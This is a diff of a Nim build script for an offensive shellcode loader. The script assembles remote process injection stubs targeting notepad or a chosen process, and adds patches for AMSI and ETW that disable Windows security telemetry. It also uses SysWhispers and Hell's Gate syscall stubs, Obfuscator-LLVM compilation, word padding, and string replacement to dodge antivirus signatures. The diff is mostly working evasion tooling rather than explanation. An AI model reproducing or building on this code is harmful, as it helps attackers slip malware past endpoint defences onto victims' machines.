+                stub.add(WhispersShellcoderemoteinjectStub)
+            else:
+                stub.add(WhispersShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocseccond)
+                stub.add(WhispersShellcoderemoteinjectStub_customprocID)
+                if (remoteETWpatch):
+                    stub.add(WhispersRemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(WhispersRemotePatchAMSIStub)
+                stub.add(WhispersShellcoderemoteinjectStub_customprocthird)
+                stub.add(WhispersShellcoderemoteinjectStub)
+        elif (getfreshstub):
+            stub.add(RemoteInjectDelegates)
+            if (processname == ""):
+                stub.add(NotepadProcIDStub)
+                if (remoteETWpatch):
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
+                stub.add(ShellcoderemoteinjectStub_notepad)
+                stub.add(ShellcoderemoteinjectStub)
+            else:
+                stub.add(ShellcoderemoteinjectStub_customprocfirst)
+                stub.add(ShellcoderemoteinjectStub_customprocseccond)
+                stub.add(ShellcoderemoteinjectStub_customprocID)
+                if (remoteETWpatch):
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
+                if (remoteAMSIpatch):
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
+                stub.add(ShellcoderemoteinjectStub_customprocthird)
+                stub.add(ShellcoderemoteinjectStub)
 
 if (csharp):
     stub.add(AssemblyImports)
-    if (AMSI or ETW):
-        if ("PS_ATTR_UNION" in stub) == false:
-            stub.add(GetSyscallStub)
-        if ("myNtProtectVirtM = pro" in stub) == false:
-            stub.add(NtProtectVirtualMemoryDelegate)
-            stub.add(NtProtectSyscallStart)
-        if ("myNtWriteVirtM = proc" in stub) == false:
-            stub.add(NtWriteVirtualMemoryDelegate)
-    if (AMSI):
-        stub.add(AMSIStub)
-        if(ETW):
-            if (COMVARETW):
-                stub.add(ETWCOMVARStub)
-            else:
-                stub.add(ETWPatchStub)
-    else:
-        if(ETW):
-            if (COMVARETW):
-                stub.add(ETWCOMVARStub)
-            else:
-                if ("PS_ATTR_UNION" in stub) == false:
-                    stub.add(GetSyscallStub)
-                stub.add(ETWPatchStub)
-    echo "adding Stub:"
     if (noArgs):
         stub.add(LoadAssemblyStub)
         stub.add(LoadAssemblyStubNoArgs)
@@ -878,13 +982,13 @@ if (csharp):
         stub.add(LoadAssemblyStub)
         stub.add(LoadAssemblyStubArgs)
 
-if(pump):
+if (pump):
     for m in pumpargs:
         if(m == "words"):
             stub.add(genEnglishwords(rand(4750..7800)))
 
-if debugMode:
-    stub =  stub.replace("import strenc", "")
+if (debugMode):
+    stub = stub.replace("import strenc", "")
 
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim, compiling -> \n\n"
@@ -898,9 +1002,9 @@ var basicCompileFlags: string = ""
 
 when system.hostOS == "windows":
     if (denim):
-        var exist: bool = existsFile("denim.exe")
+        var exist: bool = fileExists("denim.exe")
         if (exist):
-            stub =  stub.replace("import strenc", "")
+            stub = stub.replace("import strenc", "")
             writeFile("Loader.nim", stub)
             discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
             let msg = fmt"[!] Encrypted file saved to Loader.exe"
@@ -915,26 +1019,55 @@ elif system.hostOS == "linux":
         echo "No Denim support for Linux systems, sorry!"
 
 
-when system.hostOS == "windows":
-    basicCompileFlags = "nim c -d:release --hint:all:off --warning:all:off -d:danger -d:strip --opt:size "
+if (llvm):
+    echo "[+] Using LLVM-Obfuscator to compile"
+    if system.hostOS == "linux":
+        # Stolen from https://github.com/icyguider/Nimcrypt2/blob/main/nimcrypt.nim#L710
+        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
+            quit()
+    when system.hostOS == "windows":
+        var result = execCmdEx("clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
+            quit()
+elif system.hostOS == "windows":
+    basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:all:off --warning:all:off -d:danger -d:strip --opt:size "
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
 
-if compileX86:
+
+if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
 
-if(hide):
-    basicCompileFlags.add("--app=gui ")
+if (dll_out):
+    if (processname == ""):
+        basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
+    else:
+        basicCompileFlags.add("--app=lib -d:lib_only ")
 else:
-    basicCompileFlags.add("--app=console ")
-
-if (reflective):
-    basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")
+    if(hide):
+        basicCompileFlags.add("--app=gui ")
+    else:
+        basicCompileFlags.add("--app=console ")
+    if (reflective):
+        basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")
 
 if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
     discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
-else:
+elif(syswhispers != true):
     basicCompileFlags.add("--passc=-flto --passl=-flto ")
 
 # for e.g. CNA Scripts
@@ -947,8 +1080,8 @@ basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
 
 
 if debugMode:
-    basicCompileFlags =  basicCompileFlags.replace("-d:release", "")
-    basicCompileFlags =  basicCompileFlags.replace("--hint:all:off --warning:all:off -d:danger -d:strip --opt:size", "")
+    basicCompileFlags = basicCompileFlags.replace("-d:release", "")
+    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
     basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
 
 
@@ -959,7 +1092,6 @@ discard os.execShellCmd(basicCompileFlags)
 
 proc replaceList () =
     var words: seq[string]
-    var output: seq[string]
     var dictionary: string
     when system.hostOS == "windows":
         dictionary = "Dicts\\toReplace.txt"
@@ -977,7 +1109,7 @@ proc replaceList () =
         echo fmt"[!] ---> replacing {words[i]} with {randstring} "
         var command: string = fmt"nimgrep ""{words[i]}"""
         command.add(fmt" --replace {randstring} {outfile}")
-        echo command  
+        echo command
         discard exec_cmd_ex(command)
 
 if(replace):
